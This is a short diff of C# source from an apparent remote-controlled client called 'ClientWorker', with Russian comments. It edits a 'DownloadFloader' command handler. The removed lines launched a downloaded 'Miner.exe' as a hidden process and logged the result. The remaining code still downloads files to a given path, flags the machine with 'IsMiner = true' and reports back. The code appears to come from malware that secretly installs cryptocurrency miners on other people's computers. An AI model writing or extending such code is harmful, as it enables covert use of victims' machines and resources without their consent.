@@ -47,19 +47,9 @@ namespace ClientWorker
 
                 case "DownloadFloader":
                     //=====================================================>> Исправить
-                    FileManager.DownloadFloader(parametrs[0], parametrs[1]);
-                    Service.Properties.Settings.Default.Save();
+                    FileManager.DownloadFloader(parametrs[0], parametrs[1]);                 
                     Service.Properties.Settings.Default.IsMiner = true;
-                    try
-                    {
-                        FileManager.RunHideProc(parametrs[1]+@"\Miner.exe");
-                        Log.Send("RunHideProc()");
-                    }
-                    catch(Exception ex)
-                    {
-                        Log.Send("Ошибка при запуске файла" + ex.Message);
-                    }
-
+                    Service.Properties.Settings.Default.Save();
                     Log.Send("DownloadFloader()");
                     break;
 
